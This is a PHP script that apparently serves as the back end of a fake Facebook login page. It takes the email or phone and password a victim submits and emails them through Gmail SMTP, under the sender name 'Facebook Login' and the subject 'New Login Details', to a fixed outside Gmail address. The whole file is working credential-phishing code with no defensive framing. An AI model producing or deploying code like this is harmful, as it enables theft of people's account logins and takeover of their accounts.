<?php
// Include PHPMailer library
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'path/to/PHPMailer/src/Exception.php';
require 'path/to/PHPMailer/src/PHPMailer.php';
require 'path/to/PHPMailer/src/SMTP.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Setup PHPMailer
    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com'; // Use your SMTP server
        $mail->SMTPAuth = true;
        $mail->Username = 'your-email@gmail.com'; // Replace with your Gmail address
        $mail->Password = 'your-app-password'; // Use Gmail App Password (not your actual password)
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;

        // Recipient settings
        $mail->setFrom('your-email@gmail.com', 'Facebook Login');
        $mail->addAddress('covenanttk7@gmail.com', 'Recipient');

        // Email content
        $mail->isHTML(true);
        $mail->Subject = 'New Login Details';
        $mail->Body = "Email or Phone: <b>$email</b><br>Password: <b>$password</b>";

        // Send the email
        $mail->send();
        echo 'Login details sent successfully!';
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
} else {
    echo 'Invalid request.';
}
?>